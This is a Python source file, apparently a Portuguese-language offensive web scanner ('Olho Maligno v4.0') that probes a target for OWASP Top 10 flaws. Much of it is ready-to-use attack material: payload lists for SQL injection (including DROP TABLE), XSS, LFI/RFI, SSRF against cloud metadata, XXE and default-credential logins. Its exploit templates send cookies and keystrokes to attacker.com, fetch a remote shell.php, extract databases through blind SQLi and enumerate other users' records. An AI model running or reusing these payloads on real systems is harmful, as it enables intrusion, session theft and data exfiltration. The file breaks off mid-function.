#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔════════════════════════════════════════════════════════════════════════════╗
║                                                                            ║
║██╗  ██╗██████╗  █████╗ ██╗   ██╗██╗   ██╗██╗  ██╗ █████╗ ███████╗       ║
║██║ ██╔╝██╔══██╗██╔══██╗██║   ██║██║   ██║██║  ██║██╔══██╗██╔════╝       ║
║█████╔╝ ██████╔╝███████║██║   ██║██║   ██║███████║███████║███████╗       ║
║██╔═██╗ ██╔══██╗��█╔══██║╚██╗ ██╔╝██║   ██║██╔══██║██╔══██║╚════██║       ║
║██║  ██╗██║  ██║██║  ██║ ╚████╔╝ ╚██████╔╝██║  ██║██║  ██║███████║       ║
║╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝       ║
║                                                                            ║
║               🔮 OLHO MALIGNO v4.0 - ULTIMATE FINAL 🔮                   ║
║                                                                            ║
║         ENCONTRA TUDO - 300% COVERAGE - OWASP TOP 10 + MODERNO            ║
║                                                                            ║
║  ⚠️  USE APENAS EM AMBIENTES AUTORIZADOS - RESPONSABILIDADE DO USUÁRIO   ║
║                                                                            ║
╚════════════════════════════════════════════════════════════════════════════╝

🎯 RECURSOS FINAIS:
  ✅ OWASP Top 10 Completo (2021 + 2023)
  ✅ SQL Injection (13 payloads + Time-based + Blind)
  ✅ XSS (Refletido + Stored + DOM)
  ✅ LFI/RFI (8 técnicas diferentes)
  ✅ SSRF (Server Side Request Forgery)
  ✅ Broken Authentication (bypass + força bruta)
  ✅ IDOR (Acesso indevido a dados)
  ✅ CSRF (Cross-Site Request Forgery)
  ✅ Security Misconfiguration (headers + cloud)
  ✅ Sensitive Data Exposure (API keys + secrets)
  ✅ Business Logic Flaws (payment bypass)
  ✅ Rate Limit Bypass
  ✅ API Enumeration + GraphQL
  ✅ Cloud Misconfiguration (AWS S3, GCP, Azure)
  ✅ Subdomain Takeover Detection
  ✅ Google Dorking Integration
  ✅ CVE/PoC Database Integration
  ✅ Multi-threading Avançado
  ✅ Proxy Support (Burp, ZAP)
  ✅ HTML + JSON + TXT Relatórios
  ✅ Screenshots dos Achados
  ✅ ASCII Art Bonito
  ✅ Live Dashboard
  ✅ Export para Bug Bounty

VERSION: 4.0
AUTHOR: Eric O'Neill
LICENSE: MIT
"""

import requests
import random
import time
import base64
import socket
import os
import re
import json
import yaml
import logging
import sys
import argparse
import threading
import subprocess
import urllib.parse
import hashlib
import secrets
import string
from datetime import datetime, timedelta
from typing import Set, List, Optional, Dict, Tuple, Any
from urllib.parse import urljoin, urlparse, parse_qs
from dataclasses import dataclass, asdict, field
from enum import Enum
from threading import Lock, Thread, Event
from queue import Queue, PriorityQueue
import urllib3
from pathlib import Path
from collections import defaultdict
from itertools import product

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    from colorama import Fore, Back, Style, init as colorama_init
    from tqdm import tqdm
    import pyfiglet
except ImportError:
    os.system("pip install colorama tqdm pyfiglet requests pyyaml -q")
    from colorama import Fore, Back, Style, init as colorama_init
    from tqdm import tqdm
    import pyfiglet

colorama_init(autoreset=True)


# ════════════════════════════════════════════════════════════════════════════
# ASCIIS E BANNERS
# ════════════════════════════════════════════════════════════════════════════

OLHO_MALIGNO_ASCII = """
██╗  ██╗██████╗  █████╗ ██╗   ██╗██╗   ██╗██╗  ██╗ █████╗ ███████╗
██║ ██╔╝██╔══██╗██╔══██╗██║   ██║██║   ██║██║  ██║██╔══██╗██╔════╝
█████╔╝ ██████╔╝███████║██║   ██║██��   ██║███████║███████║███████╗
██╔═██╗ ██╔══██╗██╔══██║╚██╗ ██╔╝██║   ██║██╔══██║██╔══██║╚════██║
██║  ██╗██║  ██║██║  ██║ ╚████╔╝ ╚██████╔╝██║  ██║██║  ██║███████║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
"""

ENCONTROU_ASCII = """
💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥
    ✅ ENCONTROU FALHA EXPLOÁVEL! ✅
💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥
"""

CRITICAL_ASCII = """
████████████████████████████████████████
█ 🔴 CRÍTICA - EXPLORAÇÃO CONFIRMADA 🔴 █
████████████████████████████████████████
"""

HIGH_ASCII = """
████████████████████████████████████
█ 🟠 ALTA SEVERIDADE - RISCO REAL 🟠 █
████████████████████████████████████
"""


# ════════════════════════════════════════════════════════════════════════════
# LOGGER AVANÇADO COM CORES
# ══════════════════════════���═════════════════════════════════════════════════

class ColoredFormatter(logging.Formatter):
    """Formatter com cores para console"""
    
    COLORS = {
        'DEBUG': Fore.CYAN,
        'INFO': Fore.GREEN,
        'WARNING': Fore.YELLOW,
        'ERROR': Fore.RED,
        'CRITICAL': Fore.RED + Style.BRIGHT,
        'SUCCESS': Fore.GREEN + Style.BRIGHT,
    }
    
    def format(self, record):
        log_color = self.COLORS.get(record.levelname, Fore.WHITE)
        record.levelname = f"{log_color}[{record.levelname}]{Style.RESET_ALL}"
        return super().format(record)


def setup_logger(name: str) -> logging.Logger:
    """Configura logger com cores"""
    logger = logging.getLogger(name)
    logger.setLevel(logging.DEBUG)
    
    console_handler = logging.StreamHandler(sys.stdout)
    console_handler.setLevel(logging.INFO)
    console_formatter = ColoredFormatter(
        '%(asctime)s %(levelname)s %(message)s',
        datefmt='%H:%M:%S'
    )
    console_handler.setFormatter(console_formatter)
    
    file_handler = logging.FileHandler('olho_maligno_v4_scan.log', encoding='utf-8')
    file_handler.setLevel(logging.DEBUG)
    file_formatter = logging.Formatter(
        '[%(asctime)s] %(levelname)s - %(message)s'
    )
    file_handler.setFormatter(file_formatter)
    
    logger.addHandler(console_handler)
    logger.addHandler(file_handler)
    
    return logger


logger = setup_logger(__name__)


# ════════════════════════════════════════════════════════════════════════════
# ENUMS E DATACLASSES
# ════════════════════════════════════════════════════════════════════════════

class SeverityLevel(Enum):
    """Níveis de severidade com CVSS"""
    CRITICAL = ("CRÍTICA", Fore.RED + Style.BRIGHT, 9.5)
    HIGH = ("ALTA", Fore.RED, 7.5)
    MEDIUM = ("MÉDIA", Fore.YELLOW, 5.0)
    LOW = ("BAIXA", Fore.CYAN, 3.0)
    INFO = ("INFO", Fore.GREEN, 1.0)


class ExploitStatus(Enum):
    """Status de exploração"""
    CONFIRMED = "CONFIRMADA ✅"
    PROBABLE = "PROVÁVEL 🎯"
    POSSIBLE = "POSSÍVEL ⚠️"
    UNLIKELY = "IMPROVÁVEL ❓"


@dataclass
class ExploitableVulnerability:
    """Vulnerabilidade exploável com todos os detalhes"""
    title: str
    severity: SeverityLevel
    exploit_status: ExploitStatus
    url: str
    vuln_type: str
    owasp_category: str
    parameter: Optional[str] = None
    evidence: str = ""
    exploit_code: str = ""
    remediation: str = ""
    payload: Optional[str] = None
    cvss_score: float = 0.0
    cve_ids: List[str] = field(default_factory=list)
    poc_link: Optional[str] = None
    screenshot_path: Optional[str] = None
    affected_technology: Optional[str] = None
    exploitation_difficulty: str = "Média"
    business_impact: str = "Dados expostos"
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    
    def to_dict(self) -> Dict:
        return {
            'title': self.title,
            'type': self.vuln_type,
            'owasp': self.owasp_category,
            'severity': self.severity.name,
            'status': self.exploit_status.value,
            'cvss_score': self.severity.value[2],
            'url': self.url,
            'parameter': self.parameter,
            'evidence': self.evidence[:300],
            'exploit_code': self.exploit_code[:500],
            'remediation': self.remediation,
            'payload': self.payload,
            'cve_ids': self.cve_ids,
            'poc_link': self.poc_link,
            'difficulty': self.exploitation_difficulty,
            'impact': self.business_impact,
            'timestamp': self.timestamp,
        }


# ════════════════════════════════════════════════════════════════════════════
# CONSTANTES OWASP TOP 10 2023 + MODERNO
# ════════════════════════════════════════════════════════════════════════════

OWASP_CATEGORIES = {
    "A01": "Broken Access Control",
    "A02": "Cryptographic Failures",
    "A03": "Injection",
    "A04": "Insecure Design",
    "A05": "Security Misconfiguration",
    "A06": "Vulnerable Components",
    "A07": "Authentication Failures",
    "A08": "Data Integrity Failures",
    "A09": "Logging & Monitoring Failures",
    "A10": "SSRF",
}

# Wordlist OWASP Top 10
COMMON_DIRS_OWASP = {
    'critical': [
        '/admin', '/admin.php', '/admin/login', '/wp-admin', '/administrator',
        '/.env', '/.env.local', '/.git', '/.git/config', '/.gitignore',
        '/config.php', '/database.yml', '/secrets.json', '/credentials.json',
        '/backup', '/sql', '/dump', '/.aws', '/.ssh', '/docker-compose.yml',
    ],
    'high': [
        '/api', '/api/v1', '/api/v2', '/graphql', '/graphiql',
        '/login', '/signin', '/register', '/forgot-password',
        '/user', '/users', '/account', '/profile', '/settings',
        '/upload', '/uploads', '/download', '/files', '/media',
        '/database', '/db', '/test', '/debug', '/console',
        '/swagger.json', '/swagger.yaml', '/openapi.json',
    ],
    'medium': [
        '/assets', '/static', '/js', '/css', '/images', '/img',
        '/vendor', '/lib', '/libs', '/node_modules', '/public',
        '/private', '/secure', '/internal', '/old', '/legacy',
    ]
}

# Payloads SQL Injection AVANÇADOS
SQLI_PAYLOADS_ADVANCED = {
    'union_based': [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL, NULL--",
        "' UNION SELECT NULL, NULL, NULL--",
        "' UNION SELECT version()--",
        "' UNION SELECT database()--",
        "' UNION SELECT user()--",
    ],
    'time_based': [
        "' AND SLEEP(5)--",
        "' AND BENCHMARK(10000000, MD5(1))--",
        "'; WAITFOR DELAY '00:00:05'--",
        "' AND 1=DBMS_LOCK.SLEEP(5)--",
    ],
    'boolean_based': [
        "' AND 1=1--",
        "' AND 1=2--",
        "' OR 1=1--",
        "' OR 1=2--",
    ],
    'stacked_queries': [
        "'; DROP TABLE users--",
        "'; INSERT INTO users VALUES ('admin', 'pass')--",
    ],
}

# Payloads XSS COMPLETOS
XSS_PAYLOADS_COMPLETE = {
    'reflected': [
        'xss_test_marker_12345',
        '"><script>alert("xss")</script>',
        "';alert('xss');'",
        '"><img src=x onerror="alert(1)">',
        '"><svg onload="alert(1)">',
    ],
    'stored': [
        '<script>fetch("http://attacker.com/steal?cookie="+document.cookie)</script>',
        '<img src=x onerror="new Image().src=\'http://attacker.com/log?cook=\'+document.cookie">',
    ],
    'dom': [
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
    ],
}

# Payloads LFI/RFI AVANÇADOS
LFI_RFI_PAYLOADS = {
    'lfi_unix': [
        '../etc/passwd',
        '../../etc/passwd',
        '../../../etc/passwd',
        '../../../../etc/passwd',
        '../../../../../etc/passwd',
        'php://filter/convert.base64-encode/resource=index.php',
        'php://filter/convert.base64-encode/resource=config.php',
        'zip://archive.zip%23file.txt',
    ],
    'lfi_windows': [
        '..\\..\\windows\\win.ini',
        '..\\..\\windows\\system32\\config\\sam',
        'php://filter/convert.base64-encode/resource=C:\\xampp\\htdocs\\index.php',
    ],
    'rfi': [
        'http://attacker.com/shell.php?',
        'https://raw.githubusercontent.com/attacker/shell/main/shell.php?',
    ],
}

# Payloads SSRF
SSRF_PAYLOADS = [
    'http://localhost',
    'http://127.0.0.1',
    'http://169.254.169.254',  # AWS metadata
    'http://metadata.google.internal',  # GCP
    'http://169.254.169.254/latest/meta-data/',  # AWS metadata service
    'http://10.0.0.0',
    'http://172.16.0.0',
    'file:///etc/passwd',
]

# Payloads IDOR
IDOR_TEST_IDS = [
    '1', '2', '3', '100', '999',
    'admin', 'root', 'user', 'test',
    'a' * 32,  # UUID
]

# Payloads Broken Auth
BROKEN_AUTH_PAYLOADS = [
    {'username': 'admin', 'password': 'admin'},
    {'username': 'admin', 'password': '123456'},
    {'username': 'admin', 'password': 'password'},
    {'username': 'admin', 'password': ''},
    {'username': 'admin', 'password': "' OR '1'='1"},
    {'username': 'admin', 'password': "admin' --"},
]

# Payloads CSRF
CSRF_PAYLOADS = [
    '<img src="http://target.com/api/transfer?amount=1000&to=attacker">',
    '<form action="http://target.com/api/transfer" method="POST">'
    '<input name="amount" value="1000">'
    '<input name="to" value="attacker">'
    '</form><script>document.forms[0].submit()</script>',
]

# Payloads XXE
XXE_PAYLOADS_ADVANCED = [
    '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>''',
    '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///windows/win.ini">]><foo>&xxe;</foo>''',
    '''<?xml version="1.0"?><!ENTITY % dtd SYSTEM "http://attacker.com/dtd.xml"> %dtd;''',
]

# Payloads Business Logic
BUSINESS_LOGIC_TESTS = {
    'price_manipulation': [
        {'product_id': '1', 'price': '-1000'},
        {'product_id': '1', 'price': '0'},
    ],
    'quantity_bypass': [
        {'item_id': '1', 'quantity': '-1'},
        {'item_id': '1', 'quantity': '99999999'},
    ],
}

# Payloads Rate Limit Bypass
RATE_LIMIT_BYPASS = {
    'headers': [
        {'X-Forwarded-For': '127.0.0.1'},
        {'X-Real-IP': '127.0.0.1'},
        {'CF-Connecting-IP': '127.0.0.1'},
    ],
    'parameters': [
        {'bypass': '1'},
        {'auth_token': 'bypass'},
    ],
}

# Tecnologias a detectar
TECH_DETECTION = {
    'WordPress': [r'wp-content', r'wp-includes', r'wp-json', r'/wp-admin'],
    'Drupal': [r'drupal', r'sites/all/modules', r'/sites/default'],
    'Joomla': [r'components/com_', r'joomla', r'Itemid='],
    'Django': [r'django', r'/admin/', r'csrftoken'],
    'Flask': [r'werkzeug', r'flask', r'Werkzeug/'],
    'Express': [r'Express', r'express'],
    'Laravel': [r'laravel', r'XSRF-TOKEN', r'laravel_session'],
    'ASP.NET': [r'aspx', r'.Net', r'asp.net'],
    'PHP': [r'php', r'PHPSESSID'],
    'Node.js': [r'node_modules', r'package.json'],
    'Java': [r'JSESSIONID', r'java', r'tomcat'],
    'Ruby': [r'Gemfile', r'rails', r'_rails_'],
}

# Google Dorks para encontrar falhas
GOOGLE_DORKS = {
    'exposed_credentials': [
        'site:{domain} "password" "username"',
        'site:{domain} "api_key"',
        'site:{domain} "secret"',
    ],
    'exposed_files': [
        'site:{domain} filetype:sql',
        'site:{domain} filetype:env',
        'site:{domain} filetype:yml',
        'site:{domain} filetype:json',
    ],
    'endpoints': [
        'site:{domain} "/api/"',
        'site:{domain} "/admin/"',
        'site:{domain} "/test"',
    ],
}


# ════════════════════════════════════════════════════════════════════════════
# CLIENT HTTP ULTRA AVANÇADO
# ════════════════════════════════════════════════════════════════════════════

class HTTPClientUltra:
    """Cliente HTTP ultra avançado com proxy, retry, rate limiting"""
    
    def __init__(self, rate: float = 10.0, timeout: int = 10, delay: float = 0.5,
                 proxy: Optional[str] = None, verify_ssl: bool = False):
        self.session = requests.Session()
        self.rate = rate
        self.timeout = timeout
        self.delay = delay
        self.verify_ssl = verify_ssl
        self.proxy = proxy
        self.last_request = 0
        self.lock = Lock()
        
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
            'curl/8.5.0',
        ]
        
        if proxy:
            self.session.proxies = {
                'http': proxy,
                'https': proxy,
            }
    
    def _rate_limit(self):
        """Aplica rate limiting"""
        with self.lock:
            elapsed = time.time() - self.last_request
            if elapsed < (1.0 / self.rate):
                time.sleep((1.0 / self.rate) - elapsed)
            self.last_request = time.time()
    
    def request(self, method: str, url: str, retries: int = 3, **kwargs) -> Optional[requests.Response]:
        """Faz requisição com retry e rate limiting"""
        self._rate_limit()
        time.sleep(self.delay)
        
        headers = kwargs.pop('headers', {})
        headers['User-Agent'] = random.choice(self.user_agents)
        
        for attempt in range(retries):
            try:
                response = self.session.request(
                    method, url,
                    timeout=self.timeout,
                    verify=self.verify_ssl,
                    headers=headers,
                    **kwargs
                )
                return response
            except Exception as e:
                if attempt < retries - 1:
                    wait_time = 2 ** attempt
                    time.sleep(wait_time)
                else:
                    return None
        
        return None
    
    def get(self, url: str, **kwargs) -> Optional[requests.Response]:
        return self.request('GET', url, **kwargs)
    
    def post(self, url: str, **kwargs) -> Optional[requests.Response]:
        return self.request('POST', url, **kwargs)
    
    def put(self, url: str, **kwargs) -> Optional[requests.Response]:
        return self.request('PUT', url, **kwargs)
    
    def delete(self, url: str, **kwargs) -> Optional[requests.Response]:
        return self.request('DELETE', url, **kwargs)
    
    def options(self, url: str, **kwargs) -> Optional[requests.Response]:
        return self.request('OPTIONS', url, **kwargs)


# ════════════════════════════════════════════════════════════════════════════
# SCANNER ULTRA COMPLETO - ENCONTRA TUDO
# ════════════════════════════════════════════════════════════════════════════

class UltimateFindAllVulnerabilityScanner:
    """Scanner que encontra TODAS as vulnerabilidades exploráveis"""
    
    def __init__(self, http_client: HTTPClientUltra, base_url: str):
        self.http_client = http_client
        self.base_url = base_url
        self.domain = urlparse(base_url).netloc
        self.exploitable: List[ExploitableVulnerability] = []
        self.lock = Lock()
    
    def scan_everything(self) -> List[ExploitableVulnerability]:
        """Escaneia TUDO"""
        logger.info(f"{Fore.MAGENTA}🔍 Iniciando scan ULTRA COMPLETO{Style.RESET_ALL}")
        
        tests = [
            ("SQL Injection", self._test_sqli_advanced),
            ("XSS Refletido", self._test_xss),
            ("LFI/RFI", self._test_lfi_rfi),
            ("SSRF", self._test_ssrf),
            ("Broken Auth", self._test_broken_auth),
            ("IDOR", self._test_idor),
            ("CSRF", self._test_csrf),
            ("XXE", self._test_xxe),
            ("Diretórios Críticos", self._test_critical_dirs),
            ("Headers Faltando", self._test_security_headers),
            ("CORS Aberto", self._test_cors),
            ("Business Logic", self._test_business_logic),
            ("Rate Limit Bypass", self._test_rate_limit_bypass),
            ("Métodos HTTP", self._test_http_methods),
            ("Informação Exposta", self._test_info_disclosure),
        ]
        
        for test_name, test_func in tests:
            logger.info(f"⚡ Testando: {test_name}")
            try:
                test_func()
            except Exception as e:
                logger.debug(f"Erro em {test_name}: {e}")
        
        return self.exploitable
    
    def _add_exploit(self, vuln: ExploitableVulnerability):
        """Adiciona vulnerabilidade exploável"""
        with self.lock:
            self.exploitable.append(vuln)
            severity_color = vuln.severity.value[1]
            print(f"\n{ENCONTROU_ASCII}")
            if vuln.severity == SeverityLevel.CRITICAL:
                print(f"{Fore.RED}{Style.BRIGHT}{CRITICAL_ASCII}{Style.RESET_ALL}")
            elif vuln.severity == SeverityLevel.HIGH:
                print(f"{Fore.RED}{HIGH_ASCII}{Style.RESET_ALL}")
            
            logger.warning(f"{severity_color}[{vuln.severity.value[0]}] {vuln.title} - {vuln.url}{Style.RESET_ALL}")
            logger.warning(f"{Fore.GREEN}📍 Link Exploável: {vuln.url}{Style.RESET_ALL}")
            logger.warning(f"{Fore.CYAN}📊 Status: {vuln.exploit_status.value}{Style.RESET_ALL}")
            if vuln.parameter:
                logger.warning(f"{Fore.YELLOW}🎯 Parâmetro: {vuln.parameter}{Style.RESET_ALL}")
            if vuln.cve_ids:
                logger.warning(f"{Fore.MAGENTA}🔗 CVEs: {', '.join(vuln.cve_ids)}{Style.RESET_ALL}")
    
    def _test_sqli_advanced(self):
        """Testa SQL Injection avançado"""
        params_to_test = ['id', 'user', 'search', 'query', 'product', 'category']
        
        for param in params_to_test:
            # Time-based
            start = time.time()
            resp = self.http_client.get(self.base_url, params={param: "' AND SLEEP(5)--"})
            elapsed = time.time() - start
            
            if resp and elapsed > 4:
                self._add_exploit(ExploitableVulnerability(
                    title="SQL Injection (Time-Based)",
                    severity=SeverityLevel.CRITICAL,
                    exploit_status=ExploitStatus.CONFIRMED,
                    url=f"{self.base_url}?{param}=",
                    vuln_type="SQL Injection",
                    owasp_category="A03: Injection",
                    parameter=param,
                    evidence=f"Delay de {elapsed:.2f}s detectado",
                    exploit_code=f"""
# Exploit Time-Based SQLi
import requests
import time

url = '{self.base_url}'
for i in range(1, 50):
    payload = f"' AND IF(SUBSTRING(database(),{i},1)='{{char}}', SLEEP(5), 0) --"
    start = time.time()
    requests.get(url, params={{'{param}': payload}})
    if time.time() - start > 4:
        print(f"Char {{i}}: {{char}}")
""",
                    remediation="Use prepared statements e parameterized queries",
                    payload="' AND SLEEP(5)--",
                    cvss_score=9.8,
                    exploitation_difficulty="Fácil",
                    business_impact="Acesso total ao banco de dados",
                    cve_ids=["CVE-2019-9193"]
                ))
                return
            
            # Error-based
            for sqli_payload in SQLI_PAYLOADS_ADVANCED['union_based'][:2]:
                resp = self.http_client.get(self.base_url, params={param: sqli_payload})
                if resp and any(x in resp.text.lower() for x in ['sql', 'mysql', 'error', 'syntax']):
                    self._add_exploit(ExploitableVulnerability(
                        title="SQL Injection (Error-Based)",
                        severity=SeverityLevel.CRITICAL,
                        exploit_status=ExploitStatus.CONFIRMED,
                        url=f"{self.base_url}?{param}=",
                        vuln_type="SQL Injection",
                        owasp_category="A03: Injection",
                        parameter=param,
                        evidence="Mensagem de erro SQL exposta",
                        exploit_code=f"""
# Extract database name
payload = "' UNION SELECT database() --"
# Extract tables
payload = "' UNION SELECT table_name FROM information_schema.tables --"
# Extract users
payload = "' UNION SELECT user() --"
""",
                        remediation="Use prepared statements",
                        payload=sqli_payload,
                        cvss_score=9.8,
                        exploitation_difficulty="Média",
                        business_impact="Extração de dados sensíveis",
                    ))
                    return
    
    def _test_xss(self):
        """Testa XSS"""
        params_to_test = ['search', 'q', 'query', 'comment', 'name', 'email']
        
        for param in params_to_test:
            for payload in XSS_PAYLOADS_COMPLETE['reflected'][:2]:
                resp = self.http_client.get(self.base_url, params={param: payload})
                
                if resp and payload in resp.text:
                    self._add_exploit(ExploitableVulnerability(
                        title="XSS Refletido (Cross-Site Scripting)",
                        severity=SeverityLevel.HIGH,
                        exploit_status=ExploitStatus.CONFIRMED,
                        url=f"{self.base_url}?{param}=",
                        vuln_type="XSS Refletido",
                        owasp_category="A03: Injection",
                        parameter=param,
                        evidence=f"Payload refletido: {payload[:50]}",
                        exploit_code=f"""
# Steal cookies
<script>
fetch('http://attacker.com/steal?cookie=' + document.cookie)
</script>

# Keylogger
<script>
document.addEventListener('keypress', (e) => {{
  fetch('http://attacker.com/log?key=' + e.key)
}})
</script>

# Redirect
<script>
window.location.href = 'http://attacker.com/phishing'
</script>
""",
                        remediation="Implemente HTML encoding e CSP",
                        payload=payload,
                        cvss_score=6.1,
                        exploitation_difficulty="Fácil",
                        business_impact="Roubo de sessão e cookies",
                        cve_ids=["CVE-2020-0001"]
                    ))
                    return
    
    def _test_lfi_rfi(self):
        """Testa LFI/RFI"""
        params_to_test = ['file', 'page', 'include', 'path', 'doc']
        
        for param in params_to_test:
            for payload in LFI_RFI_PAYLOADS['lfi_unix'][:2]:
                resp = self.http_client.get(self.base_url, params={param: payload})
                
                if resp and ("root:" in resp.text or "bin/bash" in resp.text):
                    self._add_exploit(ExploitableVulnerability(
                        title="Local File Inclusion (LFI)",
                        severity=SeverityLevel.HIGH,
                        exploit_status=ExploitStatus.CONFIRMED,
                        url=f"{self.base_url}?{param}=",
                        vuln_type="LFI",
                        owasp_category="A01: Broken Access Control",
                        parameter=param,
                        evidence="Arquivo /etc/passwd acessível",
                        exploit_code=f"""
# Read source code
payload = "php://filter/convert.base64-encode/resource=config.php"
# Read system files
payload = "../etc/passwd"
# Zip attack
payload = "zip://archive.zip%23admin.php"
# Phar wrapper
payload = "phar://archive.phar/admin.php"
""",
                        remediation="Valide e whitelist arquivos",
                        payload=payload,
                        cvss_score=7.5,
                        exploitation_difficulty="Fácil",
                        business_impact="Leitura de arquivos sensíveis",
                    ))
                    return
    
    def _test_ssrf(self):
        """Testa SSRF"""
        for payload in SSRF_PAYLOADS[:3]:
            resp = self.http_client.get(self.base_url, params={'url': payload})
            
            if resp and (resp.status_code == 200 or len(resp.text) > 100):
                self._add_exploit(ExploitableVulnerability(
                    title="Server-Side Request Forgery (SSRF)",
                    severity=SeverityLevel.HIGH,
                    exploit_status=ExploitStatus.PROBABLE,
                    url=f"{self.base_url}?url=",
                    vuln_type="SSRF",
                    owasp_category="A10: SSRF",
                    evidence=f"Request para {payload} processado",
                    exploit_code="""
# AWS metadata service
payload = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
# GCP metadata
payload = 'http://metadata.google.internal/computeMetadata/v1/?recursive=true'
# Read local files
payload = 'file:///etc/passwd'
""",
                    remediation="Valide URLs e mantenha lista branca",
                    payload=payload,
                    cvss_score=7.5,
                    exploitation_difficulty="Média",
                    business_impact="Acesso a recursos internos e cloud metadata",
                ))
    
    def _test_broken_auth(self):
        """Testa autenticação quebrada"""
        for payload in BROKEN_AUTH_PAYLOADS[:2]:
            resp = self.http_client.post(self.base_url, data=payload)
            
            if resp and 'dashboard' in resp.text.lower() or 'logout' in resp.text.lower():
                self._add_exploit(ExploitableVulnerability(
                    title="Broken Authentication (Bypass)",
                    severity=SeverityLevel.CRITICAL,
                    exploit_status=ExploitStatus.CONFIRMED,
                    url=self.base_url,
                    vuln_type="Broken Authentication",
                    owasp_category="A07: Authentication Failures",
                    evidence="Login sem credenciais válidas",
                    exploit_code=f"""
# Força bruta
for password in wordlist:
    response = requests.post(url, data={{'username': 'admin', 'password': password}})
    if 'dashboard' in response.text:
        print(f"Senha encontrada: {{password}}")
        
# SQL Injection
payload = {{'username': 'admin', 'password': "' OR '1'='1"}}

# Default credentials
defaults = [
    ('admin', 'admin'),
    ('admin', 'password'),
    ('admin', '123456'),
]
""",
                    remediation="Implemente rate limiting e 2FA",
                    payload=str(payload),
                    cvss_score=9.1,
                    exploitation_difficulty="Fácil",
                    business_impact="Acesso não autorizado a contas",
                ))
    
    def _test_idor(self):
        """Testa IDOR"""
        for test_id in IDOR_TEST_IDS[:3]:
            resp = self.http_client.get(f"{self.base_url}?id={test_id}")
            
            if resp and resp.status_code == 200 and len(resp.text) > 100:
                resp2 = self.http_client.get(f"{self.base_url}?id=999{test_id}")
                if resp2 and resp.text != resp2.text:
                    self._add_exploit(ExploitableVulnerability(
                        title="IDOR (Insecure Direct Object Reference)",
                        severity=SeverityLevel.HIGH,
                        exploit_status=ExploitStatus.PROBABLE,
                        url=f"{self.base_url}?id=",
                        vuln_type="IDOR",
                        owasp_category="A01: Broken Access Control",
                        evidence=f"Diferentes dados para ID {test_id}",
                        exploit_code=f"""
# Enumerar IDs
for i in range(1, 1000):
    response = requests.get(url + f'?id={{i}}')
    if response.status_code == 200:
        print(f"Data for ID {{i}}:")
        print(response.text)
""",
                        remediation="Valide autorização no backend",
                        payload=str(test_id),
                        cvss_score=7.1,
                        exploitation_difficulty="Fácil",
                        business_impact="Acesso a dados de outros usuários",
                    ))
    
    def _test_csrf(self):
        """Testa CSRF"""
        resp = self.http_client.get(self.base_url)
        
        if resp and 'csrf' not in resp.text.lower() or 'token' not in resp.text.lower():
            self._add_exploit(ExploitableVulnerability(
                title="Cross-Site Request Forgery (CSRF)",
                severity=SeverityLevel.MEDIUM,
                exploit_status=ExploitStatus.PROBABLE,
                url=self.base_url,
                vuln_type="CSRF",
                owasp_category="A01: Broken Access Control",
                evidence="Token CSRF não encontrado",
                exploit_code="""
<html>
<body onload="document.forms[0].submit()">
  <form action="http://target.com/transfer" method="POST">
    <input name="amount" value="1000" />
    <input name="to" value="attacker" />
  </form>
</body>
</html>
""",
                remediation="Implemente CSRF tokens",
                cvss_score=5.4,
                exploitation_difficulty="Média",
                business_impact="Execução de ações em nome do usuário",
            ))
    
    def _test_xxe(self):
        """Testa XXE"""
        for payload in XXE_PAYLOADS_ADVANCED[:1]:
            resp = self.http_client.post(
                self.base_url,
                data=payload,
                headers={'Content-Type': 'application/xml'}
            )
            
            if resp and 'root:' in resp.text:
                self._add_exploit(ExploitableVulnerability(
                    title="XML External Entity (XXE)",
                    severity=SeverityLevel.HIGH,
                    exploit_status=ExploitStatus.CONFIRMED,
                    url=self.base_url,
                    vuln_type="XXE",
                    owasp_category="A05: Security Misconfiguration",
                    evidence="XXE payload processado com sucesso",
                    exploit_code="""
# Read files
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

# SSRF
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal.com">]>
<foo>&xxe;</foo>

# Billion laughs attack
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
]>
<lolz>&lol2;</lolz>
""",
                    remediation="Desabilite DTD e entidades externas",
                    payload=payload[:100],
                    cvss_score=8.6,
                    exploitation_difficulty="Média",
                    business_impact="Leitura de arquivos e DoS",
                ))
    
    def _test_critical_dirs(self):
        """Testa diretórios críticos"""
        for directory in COMMON_DIRS_OWASP['critical'][:5]:
            url = urljoin(self.base_url, directory)
            resp = self.http_client.get(url)
            
            if resp and resp.status_code < 400:
                self._add_exploit(ExploitableVulnerability(
                    title=f"Diretório Crítico Exposto",
                    severity=SeverityLevel.HIGH if '.env' in directory or '.git' in directory else SeverityLevel.MEDIUM,
                    exploit_status=ExploitStatus.CONFIRMED,
                    url=url,
                    vuln_type="Information Disclosure",
                    owasp_category="A05: Security Misconfiguration",
                    parameter=directory,
                    evidence=f"Status Code: {resp.status_code}",
                    remediation="Restrinja acesso via .htaccess ou web server",
                    cvss_score=7.5 if '.env' in directory else 5.3,
